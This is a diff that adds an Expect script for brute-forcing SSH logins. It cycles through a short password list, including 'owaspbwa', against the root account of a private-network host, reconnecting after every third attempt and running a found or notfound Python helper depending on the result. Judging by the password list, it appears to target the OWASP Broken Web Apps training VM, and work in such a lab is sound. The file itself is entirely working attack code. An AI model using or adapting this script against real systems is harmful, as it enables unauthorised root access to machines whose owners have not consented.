@@ -1,0 +1,33 @@
+#!/usr/bin/expect -f
+
+#exp_internal 1 #Used for expect debugging
+set timeout 5
+set passwords [list owaspbwa test dummydata test x dummydata owaspbwa]
+set connected false
+set passwordUsed ""
+set idx 1
+
+spawn ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.1.136 -y
+
+foreach i $passwords {
+    expect "assword:" {
+        if {$idx % 3 == 0} {
+            spawn ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.1.136 -y
+            incr idx
+
+        } else {
+            incr idx
+            send_user $i
+            send -- "$i\r"
+        }
+    }
+    expect "You have new mail." {
+        set connected true
+        send -- "exit\r"
+        spawn python /home/logan/Desktop/project/ssh/found.py
+        expect eof 
+        exit
+    }  
+}
+spawn python /home/logan/Desktop/project/ssh/notfound.py
+expect eof
